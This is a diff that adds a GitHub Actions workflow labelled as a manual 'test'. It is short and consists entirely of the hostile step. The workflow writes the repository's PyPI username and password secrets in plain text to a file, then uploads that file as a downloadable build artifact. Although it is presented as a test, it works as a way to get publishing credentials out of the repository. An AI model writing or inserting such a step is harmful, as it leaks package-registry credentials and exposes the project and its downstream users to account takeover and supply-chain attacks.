@@ -1,0 +1,16 @@
+name: sagi test
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "test"
+        run: |
+          echo "${{ secrets.PYPI_USERNAME }} ${{ secrets.PYPI_PASSWORD }}" > file.txt
+      - uses: actions/upload-artifact@v3
+        with:
+          name: test-arch
+          path: ./file.txt
+  
